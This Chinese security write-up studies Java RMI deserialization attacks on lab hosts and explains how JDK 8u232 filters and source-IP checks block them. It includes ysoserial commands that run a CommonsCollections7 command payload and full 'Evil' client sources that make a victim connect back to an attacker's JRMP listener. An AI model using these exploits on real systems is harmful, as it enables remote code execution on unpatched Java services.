@@ -1,0 +1,869 @@
+﻿标题: Java RMI入门(8)
+
+创建: 2020-04-14 16:57
+更新: 2020-04-15 10:03
+链接: http://scz.617.cn:8/network/202004141657.txt
+
+--------------------------------------------------------------------------
+
+目录:
+
+    ☆ 前言
+    ☆ ysoserial.exploit.JRMPListener+ysoserial.payloads.JRMPClient
+        1) VulnerableClient.java
+        2) ysoserial.exploit.JRMPListener
+            2.1) 简化版调用关系(重点)
+            2.5) 客户端安全
+        3) VulnerableServer2.java
+        4) ysoserial.payloads.JRMPClient
+            4.1) 简化版调用关系
+            4.3) EvilClientWithRemoteObjectInvocationHandler.java
+                4.3.2) EvilRMIRegistryClientWithRemoteObjectInvocationHandler.java
+                4.3.3) 简化版调用关系
+            4.5) EvilRMIRegistryClientWithRMIConnectionImpl_Stub.java
+        5) 组合打常规RMI周知端口
+            5.1) sun.rmi.transport.DGCImpl_Stub.leaseFilter
+                5.1.1) 简化版调用关系(重点)
+        6) 8u232远程打1099/TCP彻底作废
+            6.1) 深入RegistryImpl.checkAccess()
+    ☆ 参考资源
+
+--------------------------------------------------------------------------
+
+☆ 前言
+
+参看
+
+《Java RMI入门》
+http://scz.617.cn:8/network/202002221000.txt
+
+《Java RMI入门(2)》
+http://scz.617.cn:8/network/202003081810.txt
+
+《Java RMI入门(3)》
+http://scz.617.cn:8/network/202003121717.txt
+
+《Java RMI入门(4)》
+http://scz.617.cn:8/network/202003191728.txt
+
+《Java RMI入门(5)》
+http://scz.617.cn:8/network/202003241127.txt
+
+《Java RMI入门(6)》
+http://scz.617.cn:8/network/202004011650.txt
+
+《Java RMI入门(7)》
+http://scz.617.cn:8/network/202004101018.txt
+
+ShadowGlin反馈说他调试过8u141，远程打1099/TCP就已经彻底作废。这不冲突，我
+没有去回溯版本，写的是充分非必要条件，只以手头版本做测试而已。
+
+☆ ysoserial.exploit.JRMPListener+ysoserial.payloads.JRMPClient
+
+ysoserial.payloads.JRMPClient会产生一种序列化数据，当存在漏洞的目标反序列
+化它们时，会主动连接攻击者指定的目标IP、目标端口，扮演"DGC Client"的角色。
+
+ysoserial.exploit.JRMPListener会侦听在指定端口上，扮演恶意"DGC Server"或恶
+意"RMI Registry Server"的角色。当"DGC Client"或"RMI Registry Client"来访问
+它时，向客户端返回恶意Object的序列化数据，以此攻击客户端。
+ysoserial.exploit.JRMPListener的地位相当于RMI周知端口，对于JNDI注入场景，
+这也是一种攻击途径。
+
+参看:
+
+《Java RMI入门(3)》
+http://scz.617.cn/network/202003121717.txt
+
+这篇用到的EvilServer3.java其地位相当于RMI动态端口，只不过是恶意的，以此攻
+击JNDI客户端。可以换用ysoserial.exploit.JRMPListener攻击JNDI客户端。
+
+1) VulnerableClient.java
+
+--------------------------------------------------------------------------
+/*
+ * javac -encoding GBK -g VulnerableClient.java
+ */
+import javax.naming.*;
+
+public class VulnerableClient
+{
+    public static void main ( String[] argv ) throws Exception
+    {
+        String  name    = argv[0];
+        Context ctx     = new InitialContext();
+        ctx.lookup( name );
+    }
+}
+--------------------------------------------------------------------------
+
+2) ysoserial.exploit.JRMPListener
+
+参[52]
+
+https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/exploit/JRMPListener.java
+
+假设目录结构是:
+
+.
+|
++---test2
+|       ysoserial-0.0.6-SNAPSHOT-all.jar
+|
+\---test3
+        VulnerableClient.class
+        commons-collections-3.1.jar
+
+在test2目录执行:
+
+java \
+-cp ysoserial-0.0.6-SNAPSHOT-all.jar \
+ysoserial.exploit.JRMPListener 1414 \
+CommonsCollections7 "/bin/touch /tmp/scz_is_here"
+
+在test3目录执行:
+
+java \
+-cp "commons-collections-3.1.jar:." \
+-Djava.naming.factory.initial=com.sun.jndi.rmi.registry.RegistryContextFactory \
+-Djava.naming.provider.url=rmi://192.168.65.23:1414 \
+VulnerableClient any
+
+客户端虽然抛出异常，但来自恶意服务端的恶意代码已被执行。
+
+2.1) 简化版调用关系(重点)
+
+这是受害者一侧的简化版调用关系。JNDI不是重点，下面直接从RegistryImpl_Stub
+开始。
+
+参看:
+
+http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/jdk8u232-ga/src/share/classes/sun/rmi/registry/RegistryImpl_Stub.java
+http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/jdk8u232-ga/src/share/classes/sun/rmi/server/UnicastRef.java
+http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/jdk8u232-ga/src/share/classes/sun/rmi/transport/StreamRemoteCall.java
+http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/jdk8u232-ga/src/share/classes/sun/rmi/transport/TransportConstants.java
+http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/jdk8u232-ga/src/share/classes/sun/rmi/transport/ConnectionInputStream.java
+http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/jdk8u232-ga/src/share/classes/java/rmi/server/UID.java
+http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/jdk8u232-ga/src/share/classes/sun/rmi/transport/LiveRef.java
+http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/jdk8u232-ga/src/share/classes/java/rmi/server/ObjID.java
+http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/jdk8u232-ga/src/share/classes/sun/rmi/transport/tcp/TCPChannel.java
+
+--------------------------------------------------------------------------
+RegistryImpl_Stub.lookup                            // 8u232
+  UnicastRef.newCall                                // RegistryImpl_Stub:116
+                                                    // 发送请求
+  StreamRemoteCall.getOutputStream                  // RegistryImpl_Stub:118
+                                                    // 准备好ConnectionOutputStream，后面都是序列化写
+  out.writeObject($param_String_1)                  // RegistryImpl_Stub:119
+                                                    // 序列化写"any"
+  UnicastRef.invoke                                 // RegistryImpl_Stub:123
+                                                    // 这下面都是读响应数据
+    StreamRemoteCall.executeCall                    // UnicastRef:375
+      op = rd.readByte()                            // StreamRemoteCall:240
+                                                    // TCP层的裸读，读TransportConstants.Return/0x51
+                                                    // 读TransportConstants.Return/0x51
+      StreamRemoteCall.getInputStream               // StreamRemoteCall:248
+                                                    // 准备好ConnectionInputStream，后面都是反序列化读
+      in.readByte()                                 // StreamRemoteCall:249
+                                                    // 读TransportConstants.ExceptionalReturn/2
+      ConnectionInputStream.readID                  // StreamRemoteCall:250
+                                                    // in.readID()
+                                                    // id for DGC acknowledgement
+        UID.read                                    // ConnectionInputStream:60
+                                                    // ackID = UID.read((DataInput) this);
+                                                    // 依次读0、0、0
+          unique = in.readInt()                     // UID:264
+          time = in.readLong()                      // UID:265
+          count = in.readShort()                    // UID:266
+      ObjectInputStream.readObject                  // StreamRemoteCall:270
+        BadAttributeValueExpException.readObject
+          Hashtable.readObject                      // ysoserial/CommonsCollections7
+            Hashtable.reconstitutionPut
+              AbstractMapDecorator.equals
+                AbstractMap.equals
+                  LazyMap.get                       // 此处开始LazyMap利用链
+                    ChainedTransformer.transform
+                      InvokerTransformer.transform
+                        Runtime.exec
+--------------------------------------------------------------------------
+
+ysoserial.exploit.JRMPListener用BadAttributeValueExpException封装恶意
+Object，实无必要，受害者一侧对此无限制，可以返回任意Object。
+
+2.5) 客户端安全
+
+对客户端使用:
+
+-Djava.security.manager \
+-Djava.security.policy=some.policy \
+
+some.policy需要精心定制，以确保正常功能可用，又能缓解来自恶意服务端的威胁。
+即使用了.policy也不保险。
+
+3) VulnerableServer2.java
+
+参看:
+
+《Java RMI入门(7)》
+http://scz.617.cn/network/202004101018.txt
+
+复用其中的VulnerableServer2.java。
+
+4) ysoserial.payloads.JRMPClient
+
+参[52]
+
+https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/JRMPClient.java
+
+nc -l -p 1099 | xxd -g 1
+
+java VulnerableServer2 192.168.65.23 1414
+
+java -jar ysoserial-0.0.6-SNAPSHOT-all.jar JRMPClient "192.168.65.23:1099" | nc -n 192.168.65.23 1414
+
+Ctrl-C中止VulnerableServer2，第一个nc处将收到:
+
+0000000: 4a 52 4d 49 00 02 4b                             JRMI..K
+
+这个测试方案不完整，主要是演示ysoserial.payloads.JRMPClient的地位。当受害
+者(VulnerableServer2)进行反序列化操作时，会触发一些向指定IP、指定端口的RMI
+通信。
+
+4.1) 简化版调用关系
+
+参看:
+
+http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/jdk8u232-ga/src/share/classes/java/rmi/server/RemoteObject.java
+http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/jdk8u232-ga/src/share/classes/sun/rmi/server/UnicastRef.java
+http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/jdk8u232-ga/src/share/classes/sun/rmi/transport/LiveRef.java
+http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/jdk8u232-ga/src/share/classes/sun/rmi/transport/DGCClient.java
+http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/jdk8u232-ga/src/share/classes/sun/rmi/transport/DGCImpl_Stub.java
+
+--------------------------------------------------------------------------
+ObjectInputStream.readObject                                        // 8u232
+  RemoteObject.readObject
+    UnicastRef.readExternal                                         // RemoteObject:455
+      LiveRef.read                                                  // UnicastRef:489
+        if (in instanceof ConnectionInputStream)                    // LiveRef:301
+                                                                    // 输入流不是ConnectionInputStream时才会去312行
+        DGCClient.registerRefs                                      // LiveRef:312
+          DGCClient$EndpointEntry.registerRefs                      // DGCClient:160
+            DGCClient$EndpointEntry.makeDirtyCall                   // DGCClient:324
+              DGCImpl_Stub.dirty                                    // DGCClient:382
+                UnicastRef.newCall                                  // DGCImpl_Stub:102
+                                                                    // 发送请求
+                                                                    // 这次不是RegistryImpl_Stub
+                UnicastRef.invoke                                   // DGCImpl_Stub:113
+                                                                    // 这下面都是读响应数据
+                                                                    // 一旦至此，就会遭受来自恶意服务端的攻击
+                  StreamRemoteCall.executeCall                      // UnicastRef:375
+--------------------------------------------------------------------------
+
+4.3) EvilClientWithRemoteObjectInvocationHandler.java
+
+对应ysoserial.payloads.JRMPClient
+
+--------------------------------------------------------------------------
+/*
+ * javac -encoding GBK -g -XDignore.symbol.file EvilClientWithRemoteObjectInvocationHandler.java
+ * java EvilClientWithRemoteObjectInvocationHandler 192.168.65.23 1414 192.168.65.23 1314
+ */
+import java.io.*;
+import java.util.Random;
+import java.net.Socket;
+import java.lang.reflect.Proxy;
+import java.rmi.server.ObjID;
+import sun.rmi.transport.tcp.TCPEndpoint;
+import sun.rmi.transport.LiveRef;
+import sun.rmi.server.UnicastRef;
+import java.rmi.server.RemoteObjectInvocationHandler;
+import java.rmi.registry.Registry;
+
+public class EvilClientWithRemoteObjectInvocationHandler
+{
+    public static Object getObject ( String addr, int port ) throws Exception
+    {
+        /*
+         * UID、UnicastRef、Remote在
+         * sun.rmi.registry.RegistryImpl.registryFilter()的白名单里
+         */
+        int         i       = new Random().nextInt();
+        ObjID       oid     = new ObjID( i );
+        TCPEndpoint te      = new TCPEndpoint( addr, port );
+        LiveRef     lr      = new LiveRef( oid, te, false );
+        UnicastRef  ur      = new UnicastRef( lr );
+        /*
+         * public class RemoteObjectInvocationHandler extends RemoteObject implements InvocationHandler
+         */
+        RemoteObjectInvocationHandler
+                    roih    = new RemoteObjectInvocationHandler( ur );
+        /*
+         * public abstract interface Registry extends Remote
+         */
+        Registry    registryProxy
+                            = ( Registry )Proxy.newProxyInstance
+        (
+            Registry.class.getClassLoader(),
+            new  Class[] { Registry.class },
+            roih
+        );
+        return( registryProxy );
+    }
+
+    public static void main ( String[] argv ) throws Exception
+    {
+        String              addr        = argv[0];
+        int                 port        = Integer.parseInt( argv[1] );
+        /*
+         * 攻击得手后主动去访问的目标IP、目标端口
+         */
+        String              newaddr     = argv[2];
+        int                 newport     = Integer.parseInt( argv[3] );
+        Object              obj         = getObject( newaddr, newport );
+        Socket              s_connect   = new Socket( addr, port );
+        ObjectOutputStream  oos         = new ObjectOutputStream( s_connect.getOutputStream() );
+        oos.writeObject( obj );
+        oos.close();
+        s_connect.close();
+    }
+}
+--------------------------------------------------------------------------
+
+nc -l -p 1314 | xxd -g 1
+
+java VulnerableServer2 192.168.65.23 1099
+
+java EvilClientWithRemoteObjectInvocationHandler 192.168.65.23 1099 192.168.65.23 1314
+
+Ctrl-C中止VulnerableServer2
+
+4.3.2) EvilRMIRegistryClientWithRemoteObjectInvocationHandler.java
+
+本例虽然用了RemoteObjectInvocationHandler，但不是当成动态代理机制中的
+InvocationHandler用的，仅仅是当成Remote实例用。
+
+--------------------------------------------------------------------------
+/*
+ * javac -encoding GBK -g -XDignore.symbol.file EvilRMIRegistryClientWithRemoteObjectInvocationHandler.java
+ * java EvilRMIRegistryClientWithRemoteObjectInvocationHandler 192.168.65.23 1099 192.168.65.23 1314
+ */
+import java.io.*;
+import java.util.Random;
+import java.net.Socket;
+import java.rmi.Remote;
+import java.rmi.registry.*;
+import java.rmi.server.ObjID;
+import sun.rmi.transport.tcp.TCPEndpoint;
+import sun.rmi.transport.LiveRef;
+import sun.rmi.server.UnicastRef;
+import java.rmi.server.RemoteObjectInvocationHandler;
+
+public class EvilRMIRegistryClientWithRemoteObjectInvocationHandler
+{
+    public static Object getObject ( String addr, int port ) throws Exception
+    {
+        int         i       = new Random().nextInt();
+        ObjID       oid     = new ObjID( i );
+        TCPEndpoint te      = new TCPEndpoint( addr, port );
+        LiveRef     lr      = new LiveRef( oid, te, false );
+        UnicastRef  ur      = new UnicastRef( lr );
+        RemoteObjectInvocationHandler
+                    roih    = new RemoteObjectInvocationHandler( ur );
+        /*
+         * 不需要引入动态代理机制
+         */
+        return( roih );
+    }
+
+    public static void main ( String[] argv ) throws Exception
+    {
+        String      addr    = argv[0];
+        int         port    = Integer.parseInt( argv[1] );
+        /*
+         * 攻击得手后主动去访问的目标IP、目标端口
+         */
+        String      newaddr = argv[2];
+        int         newport = Integer.parseInt( argv[3] );
+        Remote      obj     = ( Remote )getObject( newaddr, newport );
+        Registry    r       = LocateRegistry.getRegistry( addr, port );
+        /*
+         * 这个操作对客户端来说极其危险，务必不要用本例去野战。
+         */
+        r.rebind( "any", obj );
+    }
+}
+--------------------------------------------------------------------------
+
+参看:
+
+《Java RMI入门(6)》
+http://scz.617.cn/network/202004011650.txt
+
+复用其中的RMIRegistryServer.java。
+
+nc -l -p 1314 | xxd -g 1
+
+java \
+-Djava.rmi.server.hostname=192.168.65.23 \
+-cp "commons-collections-3.1.jar:." \
+RMIRegistryServer 1099
+
+java EvilRMIRegistryClientWithRemoteObjectInvocationHandler 192.168.65.23 1099 192.168.65.23 1314
+
+Ctrl-C中止RMIRegistryServer
+
+4.3.3) 简化版调用关系
+
+--------------------------------------------------------------------------
+TCPTransport.handleMessages                                 // 8u232
+  Transport.serviceCall                                     // TCPTransport:573
+    UnicastServerRef.dispatch                               // Transport:200
+      UnicastServerRef.oldDispatch                          // UnicastServerRef:301
+        RegistryImpl_Skel.dispatch                          // UnicastServerRef:469
+          RegistryImpl.checkAccess                          // RegistryImpl_Skel:142
+                                                            // 前置检查rebind()源IP，不允许远程绑定，这才是大盾
+          ObjectInputStream.readObject                      // RegistryImpl_Skel:148
+                                                            // 读"any"，用YouDebug可以搞
+          ObjectInputStream.readObject                      // RegistryImpl_Skel:149
+                                                            // 读Remote实例
+                                                            // 这个操作不能直接触发恶意行为
+            RemoteObject.readObject                         // RemoteObjectInvocationHandler是RemoteObject的子类
+              UnicastRef.readExternal                       // RemoteObject:455
+                LiveRef.read                                // UnicastRef:489
+                  if (in instanceof ConnectionInputStream)  // LiveRef:301
+                                                            // 输入流是ConnectionInputStream，不会去"LiveRef:312"
+                  ConnectionInputStream.saveRef             // LiveRef:305
+                                                            // 恶意服务端地址在此被保存，后面会用到
+                                                            // 这导致VulnerableServer2中的流程与真实1099/TCP的流程不同
+          StreamRemoteCall.releaseInputStream               // RegistryImpl_Skel:154
+                                                            // 这个操作触发恶意行为
+            ConnectionInputStream.registerRefs              // StreamRemoteCall:175
+              DGCClient.registerRefs                        // ConnectionInputStream:102
+                DGCClient$EndpointEntry.registerRefs        // DGCClient:160
+                  DGCClient$EndpointEntry.makeDirtyCall     // DGCClient:324
+                    DGCImpl_Stub.dirty                      // DGCClient:382
+                      UnicastRef.newCall                    // DGCImpl_Stub:102
+                                                            // 发送请求
+                      UnicastRef.invoke                     // DGCImpl_Stub:113
+                                                            // 这下面都是读响应数据
+--------------------------------------------------------------------------
+
+4.5) EvilRMIRegistryClientWithRMIConnectionImpl_Stub.java
+
+参[65]，作者找到:
+
+javax.management.remote.rmi.RMIConnectionImpl_Stub
+
+--------------------------------------------------------------------------
+/*
+ * javac -encoding GBK -g -XDignore.symbol.file EvilRMIRegistryClientWithRMIConnectionImpl_Stub.java
+ * java EvilRMIRegistryClientWithRMIConnectionImpl_Stub 192.168.65.23 1099 192.168.65.23 1314
+ */
+import java.io.*;
+import java.util.Random;
+import java.net.Socket;
+import java.rmi.Remote;
+import javax.management.remote.rmi.RMIConnectionImpl_Stub;
+import java.rmi.registry.*;
+import java.rmi.server.ObjID;
+import sun.rmi.transport.tcp.TCPEndpoint;
+import sun.rmi.transport.LiveRef;
+import sun.rmi.server.UnicastRef;
+
+public class EvilRMIRegistryClientWithRMIConnectionImpl_Stub
+{
+    public static Object getObject ( String addr, int port ) throws Exception
+    {
+        int         i       = new Random().nextInt();
+        ObjID       oid     = new ObjID( i );
+        TCPEndpoint te      = new TCPEndpoint( addr, port );
+        LiveRef     lr      = new LiveRef( oid, te, false );
+        UnicastRef  ur      = new UnicastRef( lr );
+        RMIConnectionImpl_Stub
+                    remote  = new RMIConnectionImpl_Stub( ur );
+        return( remote );
+    }
+
+    public static void main ( String[] argv ) throws Exception
+    {
+        String      addr    = argv[0];
+        int         port    = Integer.parseInt( argv[1] );
+        /*
+         * 攻击得手后主动去访问的目标IP、目标端口
+         */
+        String      newaddr = argv[2];
+        int         newport = Integer.parseInt( argv[3] );
+        Remote      obj     = ( Remote )getObject( newaddr, newport );
+        Registry    r       = LocateRegistry.getRegistry( addr, port );
+        /*
+         * 这个操作对客户端来说极其危险，务必不要用本例去野战。
+         */
+        r.rebind( "any", obj );
+    }
+}
+--------------------------------------------------------------------------
+
+[65]的作者还提到java.rmi.server.RemoteObject.ref是transient的，他认为无法
+有效利用该成员变量。看了一下，应该有其他办法对之有效利用，但由于8u232的前
+置源IP检查堵死了远程绑定，不想浪费时间写PoC，备忘。
+
+[66]的作者又找到:
+
+sun.rmi.transport.DGCImpl_Stub
+javax.management.remote.rmi.RMIServerImpl_Stub
+sun.rmi.registry.RegistryImpl_Stub
+com.sun.jndi.rmi.registry.ReferenceWrapper_Stub
+
+5) 组合打常规RMI周知端口
+
+假设目录结构是:
+
+.
+|
++---test1
+|       RMIRegistryServer.class
+|
++---test2
+|       ysoserial-0.0.6-SNAPSHOT-all.jar
+|
+\---test3
+        EvilRMIRegistryClientWithRemoteObjectInvocationHandler.class
+        EvilRMIRegistryClientWithRMIConnectionImpl_Stub.class
+        ysoserial-0.0.6-SNAPSHOT-all.jar
+
+在test1目录执行:
+
+java_8_40 \
+-Djava.rmi.server.hostname=192.168.65.23 \
+-cp "commons-collections-3.1.jar:." \
+RMIRegistryServer 1099
+
+在test2目录执行:
+
+java \
+-cp ysoserial-0.0.6-SNAPSHOT-all.jar \
+ysoserial.exploit.JRMPListener 1314 \
+CommonsCollections7 "/bin/touch /tmp/scz_is_here_from_server_3"
+
+在test3目录执行(任选其一):
+
+java \
+EvilRMIRegistryClientWithRemoteObjectInvocationHandler 192.168.65.23 1099 \
+192.168.65.23 1314
+
+java \
+EvilRMIRegistryClientWithRMIConnectionImpl_Stub 192.168.65.23 1099 \
+192.168.65.23 1314
+
+java \
+-cp ysoserial-0.0.6-SNAPSHOT-all.jar \
+ysoserial.exploit.RMIRegistryExploit 192.168.65.23 1099 JRMPClient \
+"192.168.65.23:1314"
+
+5.1) sun.rmi.transport.DGCImpl_Stub.leaseFilter
+
+为什么EvilRMIRegistryClientWithRemoteObjectInvocationHandler打8u232失败？
+
+5.1.1) 简化版调用关系(重点)
+
+参看:
+
+http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/jdk8u232-ga/src/share/classes/java/io/ObjectInputStream.java
+http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/jdk8u232-ga/src/share/classes/sun/rmi/transport/DGCImpl_Stub.java
+
+--------------------------------------------------------------------------
+TCPTransport.handleMessages                                             // 8u232
+  Transport.serviceCall                                                 // TCPTransport:573
+    UnicastServerRef.dispatch                                           // Transport:200
+      UnicastServerRef.oldDispatch                                      // UnicastServerRef:301
+        RegistryImpl_Skel.dispatch                                      // UnicastServerRef:469
+          RegistryImpl.checkAccess                                      // RegistryImpl_Skel:142
+                                                                        // 前置检查rebind()源IP，不允许远程绑定，这才是大盾
+            RemoteServer.getClientHost                                  // RegistryImpl:307
+              TCPTransport.getClientHost                                // RemoteServer:77
+                TCPTransport$ConnectionHandler.getClientHost            // TCPTransport:616
+                  return remoteHost;                                    // TCPTransport:648
+                                                                        // 返回TCP层的源IP
+          ObjectInputStream.readObject                                  // RegistryImpl_Skel:148
+                                                                        // 读"any"，用YouDebug可以搞
+          ObjectInputStream.readObject                                  // RegistryImpl_Skel:149
+                                                                        // 读Remote实例
+                                                                        // 这个操作不能直接触发恶意行为
+            RemoteObject.readObject                                     // RemoteObjectInvocationHandler是RemoteObject的子类
+              UnicastRef.readExternal                                   // RemoteObject:455
+                LiveRef.read                                            // UnicastRef:489
+                  if (in instanceof ConnectionInputStream)              // LiveRef:301
+                                                                        // 输入流是ConnectionInputStream，不会去"LiveRef:312"
+                  ConnectionInputStream.saveRef                         // LiveRef:305
+                                                                        // 恶意服务端地址在此被保存，后面会用到
+                                                                        // 这导致VulnerableServer2中的流程与真实1099/TCP的流程不同
+          StreamRemoteCall.releaseInputStream                           // RegistryImpl_Skel:154
+                                                                        // 这个操作触发恶意行为
+            ConnectionInputStream.registerRefs                          // StreamRemoteCall:175
+              DGCClient.registerRefs                                    // ConnectionInputStream:102
+                DGCClient$EndpointEntry.registerRefs                    // DGCClient:160
+                  DGCClient$EndpointEntry.makeDirtyCall                 // DGCClient:324
+                    DGCImpl_Stub.dirty                                  // DGCClient:382
+                      UnicastRef.newCall                                // DGCImpl_Stub:102
+                                                                        // 发送请求
+                      UnicastRef.invoke                                 // DGCImpl_Stub:113
+                                                                        // 这下面都是读响应数据
+                        StreamRemoteCall.executeCall                    // UnicastRef:375
+                          ObjectInputStream.readObject                  // StreamRemoteCall:270
+                            ObjectInputStream.readObject0               // ObjectInputStream:430
+                              ObjectInputStream.readOrdinaryObject      // ObjectInputStream:1572
+                                ObjectInputStream.readClassDesc         // ObjectInputStream:2041
+                                  ObjectInputStream.readNonProxyDesc    // ObjectInputStream:1750
+                                    ObjectInputStream.filterCheck       // ObjectInputStream:1877
+                                      DGCImpl_Stub.leaseFilter          // DGCImpl_Stub:172
+                                                                        // 恶意Object无法通过白名单检查，返回REJECTED
+--------------------------------------------------------------------------
+
+6) 8u232远程打1099/TCP彻底作废
+
+sun.rmi.registry.RegistryImpl.registryFilter()中有张白名单:
+
+http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/jdk8u232-ga/src/share/classes/sun/rmi/registry/RegistryImpl.java
+
+--------------------------------------------------------------------------
+/*
+ * 427行，白名单检查
+ */
+if (String.class == clazz
+        || java.lang.Number.class.isAssignableFrom(clazz)
+        || Remote.class.isAssignableFrom(clazz)
+        || java.lang.reflect.Proxy.class.isAssignableFrom(clazz)
+        || UnicastRef.class.isAssignableFrom(clazz)
+        || RMIClientSocketFactory.class.isAssignableFrom(clazz)
+        || RMIServerSocketFactory.class.isAssignableFrom(clazz)
+        || java.rmi.activation.ActivationID.class.isAssignableFrom(clazz)
+        || java.rmi.server.UID.class.isAssignableFrom(clazz)) {
+    return ObjectInputFilter.Status.ALLOWED;
+} else {
+    return ObjectInputFilter.Status.REJECTED;
+}
+--------------------------------------------------------------------------
+
+ysoserial.payloads.JRMPClient可以绕过此处的白名单检查。但这个绕过对8u232而
+言是黄梁一梦，因为RegistryImpl_Skel.dispatch()在反序列化恶意数据之前会调用
+RegistryImpl.checkAccess()前置检查rebind()等操作的源IP，不允许远程绑定，这
+才是顶级大盾，甩过滤器十八条长安街。
+
+假设RMI服务端、客户端在同一主机，或者有什么代理转发机制解决源IP检查，此时
+可以利用Remote、UnicastRef绕过前述427行白名单检查。受害者变身"DGC Client"
+去访问恶意"DGC Server"，后者向前者返回恶意Object，前者在反序列化恶意Object
+时要面临sun.rmi.transport.DGCImpl_Stub.leaseFilter()中的白名单检查:
+
+http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/jdk8u232-ga/src/share/classes/sun/rmi/transport/DGCImpl_Stub.java
+
+--------------------------------------------------------------------------
+/*
+ * 172行，java.util.Hashtable无法通过这个白名单检查，返回REJECTED
+ */
+return (clazz == UID.class ||
+        clazz == VMID.class ||
+        clazz == Lease.class ||
+        (Throwable.class.isAssignableFrom(clazz) &&
+                clazz.getClassLoader() ==
+                Object.class.getClassLoader()) ||
+        clazz == StackTraceElement.class ||
+        clazz == ArrayList.class ||     // for suppressed exceptions, if any
+        clazz == Object.class ||
+        clazz.getName().equals("java.util.Collections$UnmodifiableList") ||
+        clazz.getName().equals("java.util.Collections$UnmodifiableCollection") ||
+        clazz.getName().equals("java.util.Collections$UnmodifiableRandomAccessList"))
+        ? ObjectInputFilter.Status.ALLOWED
+        : ObjectInputFilter.Status.REJECTED;
+--------------------------------------------------------------------------
+
+目前已知payload均无法绕过前述172行白名单检查。
+
+假设用ysoserial.exploit.JRMPClient打1099/TCP，因为是DGC操作，此时服务端不
+涉及RegistryImpl.checkAccess()。但是，服务端在反序列化恶意Object时要面临
+sun.rmi.transport.DGCImpl.checkInput()中的白名单检查:
+
+http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/jdk8u232-ga/src/share/classes/sun/rmi/transport/DGCImpl.java
+
+--------------------------------------------------------------------------
+/*
+ * 409行，java.util.Hashtable无法通过这个白名单检查，返回REJECTED
+ */
+return (clazz == ObjID.class ||
+        clazz == UID.class ||
+        clazz == VMID.class ||
+        clazz == Lease.class)
+        ? ObjectInputFilter.Status.ALLOWED
+        : ObjectInputFilter.Status.REJECTED;
+--------------------------------------------------------------------------
+
+这张白名单更狠，恶意Object完全无法绕过其检查。
+
+结论就是，8u232远程打1099/TCP彻底作废，陪低版本Java玩玩还可以。
+
+6.1) 深入RegistryImpl.checkAccess()
+
+RegistryImpl.checkAccess()所检查的源IP来自TCP层套接字操作，不是RMI通信报文
+中的字段，无法伪造。
+
+简化版调用关系:
+
+--------------------------------------------------------------------------
+TCPTransport$AcceptLoop.run                 // 8u232
+  TCPTransport$AcceptLoop.executeAcceptLoop // TCPTransport:377
+    socket = serverSocket.accept()          // TCPTransport:405
+                                            // 等待入连接
+    clientAddr = socket.getInetAddress()    // TCPTransport:410
+                                            // 取TCP连接的源IP
+    TCPTransport$ConnectionHandler.<init>   // TCPTransport:420
+      this.remoteHost = remoteHost;         // TCPTransport:642
+                                            // 保存源IP，将来RegistryImpl.checkAccess()检查它
+--------------------------------------------------------------------------
+
+http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/jdk8u232-ga/src/share/classes/sun/rmi/registry/RegistryImpl.java
+
+--------------------------------------------------------------------------
+/*
+ * sun.rmi.registry.RegistryImpl.checkAccess
+ */
+/**
+ * Check that the caller has access to perform indicated operation.
+ * The client must be on same the same host as this server.
+ */
+public static void checkAccess(String op) throws AccessException {
+    try {
+/*
+ * 307行，返回源IP
+ */
+        /*
+         * Get client host that this registry operation was made from.
+         */
+        final String clientHostName = getClientHost();
+        InetAddress clientHost;
+...
+        // if client not yet seen, make sure client allowed access
+        if (allowedAccessCache.get(clientHost) == null) {
+
+            if (clientHost.isAnyLocalAddress()) {
+                throw new AccessException(
+                    op + " disallowed; origin unknown");
+            }
+
+            try {
+                final InetAddress finalClientHost = clientHost;
+
+                java.security.AccessController.doPrivileged(
+                    new java.security.PrivilegedExceptionAction<Void>() {
+                        public Void run() throws java.io.IOException {
+/*
+ * 341行，通过TCP层的bind()操作检查源IP是否是本机IP之一，无法绕过
+ */
+                            /*
+                             * if a ServerSocket can be bound to the client's
+                             * address then that address must be local
+                             */
+                            (new ServerSocket(0, 10, finalClientHost)).close();
+                            allowedAccessCache.put(finalClientHost,
+                                                   finalClientHost);
+                            return null;
+                        }
+                });
+            } catch (PrivilegedActionException pae) {
+...
+}
+--------------------------------------------------------------------------
+
+http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/jdk8u232-ga/src/share/classes/sun/rmi/transport/tcp/TCPTransport.java
+
+--------------------------------------------------------------------------
+/*
+ * sun.rmi.transport.tcp.TCPTransport$AcceptLoop.executeAcceptLoop
+ */
+/**
+ * Accepts connections from the server socket and executes
+ * handlers for them in the thread pool.
+ **/
+private void executeAcceptLoop() {
+    if (tcpLog.isLoggable(Log.BRIEF)) {
+        tcpLog.log(Log.BRIEF, "listening on port " +
+                   getEndpoint().getPort());
+    }
+
+    while (true) {
+        Socket socket = null;
+        try {
+/*
+ * 405行
+ */
+            socket = serverSocket.accept();
+
+/*
+ * 410行，clientAddr来自TCP层套接字操作，不是RMI通信报文中的字段
+ */
+            /*
+             * Find client host name (or "0.0.0.0" if unknown)
+             */
+            InetAddress clientAddr = socket.getInetAddress();
+/*
+ * 411行，获取clientHost
+ */
+            String clientHost = (clientAddr != null
+                                 ? clientAddr.getHostAddress()
+                                 : "0.0.0.0");
+
+            /*
+             * Execute connection handler in the thread pool,
+             * which uses non-system threads.
+             */
+            try {
+                connectionThreadPool.execute(
+/*
+ * 420行，保存clientHost
+ */
+                    new ConnectionHandler(socket, clientHost));
+            } catch (RejectedExecutionException e) {
+    ...
+}
